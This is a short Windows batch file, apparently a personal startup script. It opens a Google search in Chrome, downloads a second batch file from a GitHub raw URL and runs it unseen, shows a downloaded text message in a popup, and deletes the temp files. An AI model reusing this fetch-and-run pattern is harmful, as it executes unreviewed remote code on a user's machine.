@echo off
set tempFile1=%temp%\tempfile1.txt
set tempBatFile=%temp%\downloaded_script.bat
::Made by Harri Wailand , 2025 01 04 15:22 Germany 
setlocal enabledelayedexpansion

start /min chrome.exe --start-maximized "https://www.google.de/search?q=rally+pizza"

curl -o %tempBatFile% https://raw.githubusercontent.com/HaWai12/21847858/refs/heads/main/callmemaybe.bat
if errorlevel 1 (
    exit /b 1
)

call %tempBatFile%

curl -o %tempFile1% https://raw.githubusercontent.com/HaWai12/21847858/refs/heads/main/2357625.txt
if errorlevel 1 (
    exit /b 1
)
set /p fileContent=<%tempFile1%
powershell -Command "$wshell = New-Object -ComObject WScript.Shell; $wshell.Popup('%fileContent%', 0, 'Startup', 64)"
del %tempFile1%
del %tempBatFile%

endlocal
